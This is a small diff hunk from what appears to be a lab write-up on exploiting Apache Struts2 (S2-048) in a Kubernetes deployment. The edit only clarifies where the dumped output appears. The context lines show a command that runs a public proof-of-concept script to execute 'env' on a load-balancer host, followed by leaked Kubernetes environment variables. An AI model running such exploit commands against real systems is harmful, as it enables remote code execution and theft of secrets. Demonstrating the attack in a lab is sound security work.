@@ -40,7 +40,7 @@ OK now we can attack, from the attacker "box" (actually just a tmux on my ubuntu
 cd ~/apache-struts2-PoC  
 python exploitS2-048-cmd.py 12345.us-west-2.elb.amazonaws.com:8080 'env'  
 
-...and we dump the environment to the CC server, not good!  
+...and we dump the environment from our struts box, to our attacker "box" and see it on STDOUT... not good!  
 
 KUBERNETES_SERVICE_PORT_HTTPS=443  
 KUBERNETES_SERVICE_PORT=443  
